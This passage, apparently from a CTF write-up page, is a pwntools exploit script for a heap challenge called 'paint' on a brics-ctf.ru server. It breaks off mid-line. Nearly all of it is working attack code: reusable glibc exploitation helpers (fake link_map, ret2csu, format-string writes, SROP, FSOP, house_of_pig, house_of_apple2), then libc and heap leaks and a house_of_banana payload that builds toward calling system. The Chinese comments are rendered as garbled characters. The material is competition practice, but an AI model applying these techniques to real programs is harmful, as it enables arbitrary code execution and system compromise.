class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># context.aslr = False</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc_name = <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">remote_ip = <span class="string">&quot;paint-71ae86dc10a3fe17.brics-ctf.ru&quot;</span></span><br><span class="line">remote_port = <span class="string">&quot;13003&quot;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">mode = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: p.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: p.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> mode:</span><br><span class="line">    p = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(filename, stdin=PTY)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bpp</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\x1B[36m&#123;&#125;\x1B[0m&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_Linkmap_payload</span>(<span class="params">fake_linkmap_addr,known_func_ptr,offset</span>): <span class="comment"># fake_linkmap_addræŒ‡å‘ä¸€æ®µå¯æ§å†…å­˜ | known_func_ptræŒ‡å‘ä¸€ä¸ªå·²çŸ¥çš„å‡½æ•°çš„gotè¡¨åœ°å€ | offsetæ˜¯systemå‡½æ•°å’Œè¿™ä¸ªå‡½æ•°åœ¨libcä¸Šçš„åç§»</span></span><br><span class="line">    <span class="comment"># &amp;(2**64-1)æ˜¯å› ä¸ºoffseté€šå¸¸ä¸ºè´Ÿæ•°ï¼Œå¦‚æœä¸æ§åˆ¶èŒƒå›´ï¼Œp64åä¼šè¶Šç•Œï¼Œå‘ç”Ÿé”™è¯¯</span></span><br><span class="line">    linkmap = p64(offset &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>)) <span class="comment">#l_addr</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake_linkmap_addr + 8ï¼Œä¹Ÿå°±æ˜¯DT_JMPRELï¼Œè‡³äºä¸ºä»€ä¹ˆæœ‰ä¸ª0ï¼Œå¯ä»¥å‚è€ƒIDAä¸Š.dyamiscçš„ç»“æ„å†…å®¹</span></span><br><span class="line">    linkmap += p64(<span class="number">0</span>) <span class="comment"># å¯ä»¥ä¸ºä»»æ„å€¼</span></span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x18</span>) <span class="comment"># è¿™é‡Œçš„å€¼å°±æ˜¯ä¼ªé€ çš„.rel.pltçš„åœ°å€</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake_linkmap_addr + 0x18,fake_rel_write,å› ä¸ºwriteå‡½æ•°pushçš„ç´¢å¼•æ˜¯0ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€é¡¹</span></span><br><span class="line">    linkmap += p64((fake_linkmap_addr + <span class="number">0x30</span> - offset) &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>)) <span class="comment"># Rela-&gt;r_offset,æ­£å¸¸æƒ…å†µä¸‹è¿™é‡Œåº”è¯¥å­˜çš„æ˜¯gotè¡¨å¯¹åº”æ¡ç›®çš„åœ°å€ï¼Œè§£æå®Œæˆååœ¨è¿™ä¸ªåœ°å€ä¸Šå­˜æ”¾å‡½æ•°çš„å®é™…åœ°å€ï¼Œæ­¤å¤„æˆ‘ä»¬åªéœ€è¦è®¾ç½®ä¸€ä¸ªå¯è¯»å†™çš„åœ°å€å³å¯ </span></span><br><span class="line">    linkmap += p64(<span class="number">0x7</span>) <span class="comment"># Rela-&gt;r_info,ç”¨äºç´¢å¼•symtabä¸Šçš„å¯¹åº”é¡¹ï¼Œ7&gt;&gt;32=0ï¼Œä¹Ÿå°±æ˜¯æŒ‡å‘symtabçš„ç¬¬ä¸€é¡¹</span></span><br><span class="line">    linkmap += p64(<span class="number">0</span>)<span class="comment"># Rela-&gt;r_addend,ä»»æ„å€¼éƒ½è¡Œ</span></span><br><span class="line"></span><br><span class="line">    linkmap += p64(<span class="number">0</span>)<span class="comment">#l_ns</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake_linkmap_addr + 0x38, DT_SYMTAB </span></span><br><span class="line">    linkmap += p64(<span class="number">0</span>) <span class="comment"># å‚è€ƒIDAä¸Š.dyamiscçš„ç»“æ„</span></span><br><span class="line">    linkmap += p64(known_func_ptr - <span class="number">0x8</span>) <span class="comment"># è¿™é‡Œçš„å€¼å°±æ˜¯ä¼ªé€ çš„symtabçš„åœ°å€,ä¸ºå·²è§£æå‡½æ•°çš„gotè¡¨åœ°å€-0x8</span></span><br><span class="line"></span><br><span class="line">    linkmap += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr) <span class="comment"># fake_linkmap_addr + 0x68, å¯¹åº”çš„å€¼çš„æ˜¯DT_STRTABçš„åœ°å€ï¼Œç”±äºæˆ‘ä»¬ç”¨ä¸åˆ°strtabï¼Œæ‰€ä»¥éšæ„è®¾ç½®äº†ä¸€ä¸ªå¯è¯»åŒºåŸŸ</span></span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x38</span>) <span class="comment"># fake_linkmap_addr + 0x70 , å¯¹åº”çš„å€¼æ˜¯DT_SYMTABçš„åœ°å€</span></span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x8</span>) <span class="comment"># fake_linkmap_addr + 0xf8, å¯¹åº”çš„å€¼æ˜¯DT_JMPRELçš„åœ°å€</span></span><br><span class="line">    <span class="keyword">return</span> linkmap</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">orw_shellcode</span>():</span><br><span class="line">    payload=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">    payload+=shellcraft.read(<span class="number">3</span>,<span class="string">&#x27;./flag&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">    payload+=shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;./flag&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">    payload=asm(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu_gadget</span>(<span class="params">part1, part2, jmp2, arg1 = <span class="number">0</span>, arg2 = <span class="number">0</span>, arg3 = <span class="number">0</span></span>): <span class="comment"># -&gt;å¯èƒ½éœ€è¦å…·ä½“é—®é¢˜å…·ä½“åˆ†æ</span></span><br><span class="line">    payload = p64(part1)    <span class="comment"># part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)    <span class="comment"># rbx be 0x0</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)    <span class="comment"># rbp be 0x1</span></span><br><span class="line">    payload += p64(jmp2)    <span class="comment"># r12 jump to</span></span><br><span class="line">    payload += p64(arg3)    <span class="comment"># r13 -&gt; rdx    arg3</span></span><br><span class="line">    payload += p64(arg2)    <span class="comment"># r14 -&gt; rsi    arg2</span></span><br><span class="line">    payload += p64(arg1)    <span class="comment"># r15 -&gt; edi    arg1</span></span><br><span class="line">    payload += p64(part2)    <span class="comment"># part2 entry will call [r12 + rbx * 0x8]</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">56</span>    <span class="comment"># junk 6 * 8 + 8 = 56</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>():</span><br><span class="line">    leak_dat = ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:]</span><br><span class="line">    <span class="keyword">return</span> u64(leak_dat.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmlstr</span>(<span class="params">offset1, offset2, chain2, target, prefix</span>): <span class="comment"># partial write</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> (target&amp;<span class="number">0xff</span>) != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">                sa(prefix, <span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>(((chain2&amp;<span class="number">0xff</span>) + i), offset1).encode() + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">                sleep(<span class="number">0.05</span>)</span><br><span class="line">            sa(prefix, <span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>((target&amp;<span class="number">0xff</span>), offset2).encode() + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">            sleep(<span class="number">0.05</span>)</span><br><span class="line">            target &gt;&gt;= <span class="number">8</span></span><br><span class="line">    sa(prefix, <span class="string">&quot;%&#123;&#125;c%8$hhn&quot;</span>.<span class="built_in">format</span>((chain2&amp;<span class="number">0xff</span>)).encode() + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmlstr2</span>(<span class="params">offset1, offset2, chain2, target, prefix</span>): <span class="comment"># partial write</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> (target&amp;<span class="number">0xffff</span>) != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">                sa(prefix, <span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>(((chain2&amp;<span class="number">0xff</span>) + i*<span class="number">2</span>), offset1).encode() + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">                sleep(<span class="number">0.05</span>)</span><br><span class="line">            sa(prefix, <span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;</span>.<span class="built_in">format</span>((target&amp;<span class="number">0xffff</span>), offset2).encode() + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">            sleep(<span class="number">0.05</span>)</span><br><span class="line">            target &gt;&gt;= <span class="number">16</span></span><br><span class="line">    sa(prefix, <span class="string">&quot;%&#123;&#125;c%8$hhn&quot;</span>.<span class="built_in">format</span>((chain2&amp;<span class="number">0xff</span>)).encode() + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SROP</span>(<span class="params">rdi, rsp, rip</span>):</span><br><span class="line">    signframe = SigreturnFrame()</span><br><span class="line">    signframe.rax = constants.SYS_execve</span><br><span class="line">    signframe.rdi = rdi</span><br><span class="line">    signframe.rsi = <span class="number">0x0</span></span><br><span class="line">    signframe.rdx = <span class="number">0x0</span></span><br><span class="line">    signframe.rsp = rsp</span><br><span class="line">    signframe.rip = rip</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(signframe)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FSOP</span>(<span class="params">fake_vtable_addr</span>):</span><br><span class="line">    <span class="comment"># only in glibc 2.23 </span></span><br><span class="line">    <span class="comment"># 2.23+ vtableæœ‰èŒƒå›´æ ¡éªŒ æ­¤æ—¶ä¸å¦‚åˆ«çš„æ‰“æ³•å¥½æ‰“</span></span><br><span class="line">    <span class="comment"># è§¦å‘æ–¹å¼åªè¦èƒ½å‡ºå‘_IO_overflowå³å¯(å…¶å®æœ‰å…³IOæµçš„åªè¦ç»è¿‡vtableåº”è¯¥éƒ½èƒ½æ‰“)</span></span><br><span class="line">    <span class="keyword">from</span> pwncli <span class="keyword">import</span> IO_FILE_plus_struct</span><br><span class="line">    fake_IO_FILE = IO_FILE_plus_struct()</span><br><span class="line">    fake_IO_FILE._mode = <span class="number">0</span></span><br><span class="line">    fake_IO_FILE._IO_write_ptr = <span class="number">1</span></span><br><span class="line">    fake_IO_FILE._IO_write_base = <span class="number">0</span></span><br><span class="line">    fake_IO_FILE.flags = <span class="number">0x68732f6e69622f</span> <span class="comment"># /bin/sh\x00</span></span><br><span class="line">    fake_IO_FILE.vtable = fake_vtable_addr</span><br><span class="line">    IO_FILE = <span class="built_in">bytes</span>(fake_IO_FILE)</span><br><span class="line">    <span class="keyword">return</span> IO_FILE</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">house_of_pig</span>(<span class="params">_IO_str_jumps, bin_addr, bin_size, system_addr</span>):</span><br><span class="line">    <span class="comment"># 2.34ä¹‹å‰ä»èƒ½ç”¨house_of_pigæ‰“ï¼Œ2.34ä¹‹åå„ç§hookå‡½æ•°è¢«å¼„æ‰äº† ä¸è¿‡å¯ä»¥çœ‹çœ‹house_of_pig_plus</span></span><br><span class="line">    <span class="comment"># åŸç†ï¼šåªè¦èƒ½è·‘åˆ°_IO_oveflowå°±ä¼šè·³è½¬åˆ°_IO_str_overflowç„¶åå°±ä¼šmalloc-&gt;memcpy-&gt;free  /||gadget</span></span><br><span class="line">    <span class="comment"># å°½é‡ç”³è¯·free_hook - 0x20ç„¶ååˆ©ç”¨_IO_save_base + _IO_backup_baseæ¥å¤„ç†memcpyé‚£éƒ¨åˆ†</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    #define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br><span class="line"><span class="string">    char *old_buf = fp-&gt;_IO_buf_base; # éœ€è¦æ§åˆ¶_IO_buf_base </span></span><br><span class="line"><span class="string">	size_t old_blen = _IO_blen (fp);</span></span><br><span class="line"><span class="string">	size_t new_size = 2 * old_blen + 100;</span></span><br><span class="line"><span class="string">    new_buf = malloc (new_size); # è®¡ç®—å¥½ç”³è¯·å‡ºæ¥</span></span><br><span class="line"><span class="string">    memcpy (new_buf, old_buf, old_blen); #è¦†ç›–(</span></span><br><span class="line"><span class="string">	free (old_buf);</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">from</span> pwncli <span class="keyword">import</span> IO_FILE_plus_struct</span><br><span class="line">    fake_IO_FILE = IO_FILE_plus_struct()</span><br><span class="line">    fake_IO_FILE._mode = <span class="number">0</span></span><br><span class="line">    fake_IO_FILE._IO_write_ptr = <span class="number">1</span></span><br><span class="line">    fake_IO_FILE._IO_write_base = <span class="number">0</span></span><br><span class="line">    fake_IO_FILE.vtable = _IO_str_jumps</span><br><span class="line">    fake_IO_FILE._IO_buf_base = bin_addr</span><br><span class="line">    fake_IO_FILE._IO_buf_end = bin_addr + <span class="built_in">int</span>((bin_size - <span class="number">100</span>) / <span class="number">2</span>)</span><br><span class="line">    fake_IO_FILE._IO_save_base = system_addr</span><br><span class="line">    fake_IO_FILE._IO_backup_base = system_addr</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(fake_IO_FILE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">house_of_apple2</span>(<span class="params">_IO_wfile_jumps, wide_data_entry, wide_data_vtable_entry, RIP</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    è°ƒç”¨æµä¸º_IO_wfile_overflow-&gt;_IO_wdoallocbuf-&gt;_IO_WDOALLOCATE-&gt;Your RIP</span></span><br><span class="line"><span class="string">    _flagsè®¾ç½®ä¸º~(2 | 0x8 | 0x800)ï¼Œå¦‚æœä¸éœ€è¦æ§åˆ¶rdiï¼Œè®¾ç½®ä¸º0å³å¯ï¼›å¦‚æœéœ€è¦è·å¾—shellï¼Œå¯è®¾ç½®ä¸º  sh;ï¼Œæ³¨æ„å‰é¢æœ‰ä¸¤ä¸ªç©ºæ ¼</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># main</span></span><br><span class="line">    <span class="keyword">from</span> pwncli <span class="keyword">import</span> IO_FILE_plus_struct</span><br><span class="line">    fake_IO_FILE = IO_FILE_plus_struct()</span><br><span class="line">    fake_IO_FILE.flags = <span class="number">0x68732020</span></span><br><span class="line">    fake_IO_FILE._mode = <span class="number">0</span></span><br><span class="line">    fake_IO_FILE._IO_write_ptr = <span class="number">1</span></span><br><span class="line">    fake_IO_FILE._IO_write_base = <span class="number">0</span></span><br><span class="line">    fake_IO_FILE.vtable = _IO_wfile_jumps</span><br><span class="line">    fake_IO_FILE._wide_data = wide_data_entry</span><br><span class="line">    fake_IO_FILE = <span class="built_in">bytes</span>(fake_IO_FILE)</span><br><span class="line">    <span class="comment"># wide_data è¿™é‡Œåªè¦æ§åˆ¶vtableå³å¯</span></span><br><span class="line">    pad = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(heap_base + <span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) * (<span class="number">28</span>-<span class="number">7</span>)</span><br><span class="line">    pad += p64(wide_data_vtable_entry)</span><br><span class="line">    <span class="comment"># wide_data_vtable</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;_wide_data-&gt;_wide_vtable-&gt;doallocateè®¾ç½®ä¸ºåœ°å€Cç”¨äºåŠ«æŒRIPï¼Œå³æ»¡è¶³(B + 0x68) = C&quot;&quot;&quot;</span></span><br><span class="line">    payload = p64(RIP)*<span class="number">14</span></span><br><span class="line">    <span class="keyword">return</span> (fake_IO_FILE, pad, payload)</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;6. Delete canvas&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sla(prefix, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, width, height</span>):</span><br><span class="line">    sla(prefix, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;Enter canvas width (1-255): &quot;</span>, <span class="built_in">str</span>(width))</span><br><span class="line">    sla(<span class="string">&quot;Enter canvas height (1-255): &quot;</span>, <span class="built_in">str</span>(height))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sla(prefix, <span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, payload</span>):</span><br><span class="line">    sla(prefix, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sa(<span class="string">&quot;Enter your picture (`width` chars in `height` lines): &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rate</span>(<span class="params">index, rate, comment, payload</span>):</span><br><span class="line">    sla(prefix, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;Enter rate: &quot;</span>, <span class="built_in">str</span>(rate))</span><br><span class="line">    sla(<span class="string">&quot;Leave comment (y/n): &quot;</span>, comment)</span><br><span class="line">    sa(<span class="string">&quot;Enter your comment: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resize</span>(<span class="params">index, width, height</span>):</span><br><span class="line">    sla(prefix, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;Enter new width (1-255): &quot;</span>, <span class="built_in">str</span>(width))</span><br><span class="line">    sla(<span class="string">&quot;Enter new height (1-255): &quot;</span>, <span class="built_in">str</span>(height))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    sla(prefix, <span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;leak libc&quot;&quot;&quot;</span></span><br><span class="line">show(-<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">leak_dat = leak()</span><br><span class="line">log(<span class="built_in">hex</span>(leak_dat))</span><br><span class="line"></span><br><span class="line">libc_base = leak_dat - (<span class="number">0x7f510501ba80</span> - <span class="number">0x7f5104e00000</span>)</span><br><span class="line">log(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;leak heap&quot;&quot;&quot;</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x10</span>, <span class="number">2</span>)</span><br><span class="line">rate(<span class="number">0</span>, <span class="number">1</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">rate(<span class="number">0</span>, <span class="number">1</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x10</span>, <span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Picture: \n&quot;</span>)</span><br><span class="line">heap_base = u64(r(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment"># L &gt;&gt; 12 è¡¥å›å»åˆšå¥½æ˜¯heap_base</span></span><br><span class="line">heap_base = heap_base &lt;&lt; <span class="number">12</span></span><br><span class="line">log(<span class="built_in">hex</span>(heap_base &lt;&lt; <span class="number">12</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;house_of_banana&quot;&quot;&quot;</span></span><br><span class="line">_rtld_global = libc_base + (<span class="number">0x7ffff7ffd040</span> - <span class="number">0x7ffff7c00000</span>)</span><br><span class="line"></span><br><span class="line">log(<span class="built_in">hex</span>(_rtld_global))</span><br><span class="line"></span><br><span class="line">fake_addr = heap_base + <span class="number">0x490</span></span><br><span class="line">l_next = libc_base + (<span class="number">0x7ffff7ffe890</span> - <span class="number">0x7ffff7c00000</span>)</span><br><span class="line">ret_addr = libc_base + <span class="number">0x0000000000029cd6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">house_of_banana</span>(<span class="params">fake_addr, l_next, gadget, count</span>):</span><br><span class="line">    fake_content = p64(<span class="number">0</span>) + p64(<span class="number">0</span>) <span class="comment"># l_addr keep zero to array</span></span><br><span class="line">    fake_content += p64(<span class="number">0</span>) + p64(l_next) <span class="comment"># l_next # check 1 for assert</span></span><br><span class="line">    fake_content += p64(<span class="number">0</span>) + p64(fake_addr) <span class="comment"># l_real == _ns_loaded # check 1 for assert</span></span><br><span class="line">    fake_content += p64(<span class="number">0x8</span>) <span class="comment"># check 3</span></span><br><span class="line">    fake_content += p64(<span class="number">0x8</span>) <span class="comment"># check 3</span></span><br><span class="line">    fake_content += p64(<span class="number">0x8</span>) <span class="comment"># check 3</span></span><br><span class="line">    fake_content = fake_content.ljust(<span class="number">0x48</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_content += p64(fake_addr + <span class="number">0x58</span>) <span class="comment"># l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</span></span><br><span class="line">    fake_content += p64(<span class="number">0x8</span> * count) <span class="comment"># gadgets count * 8 # l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span></span><br><span class="line">    fake_content += gadget <span class="comment"># reverse_gadget</span></span><br><span class="line">    fake_content = fake_content.ljust(<span class="number">0x110</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_content += p64(fake_addr + <span class="number">0x40</span>) <span class="comment"># l-&gt;l_info[DT_FINI_ARRAY]</span></span><br><span class="line">    fake_content += p64(<span class="number">0</span>) + p64(fake_addr + <span class="number">0x48</span>) <span class="comment">#l-&gt;l_info[DT_FINI_ARRAYSZ]</span></span><br><span class="line">    fake_content = fake_content.ljust(<span class="number">0x31c</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># 0x31c / 0x314</span></span><br><span class="line">    fake_content += p64(<span class="number">0x1c</span>) <span class="comment"># check 2 to l_init_called</span></span><br><span class="line">    <span class="keyword">return</span> fake_content</span><br><span class="line"></span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">bin_addr = libc_base + <span class="number">0x00000000001d8698</span></span><br><span class="line">gadget = p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]) + p64(setcontext + <span class="number">306</span>) + p64(ret_addr) + p64(<span 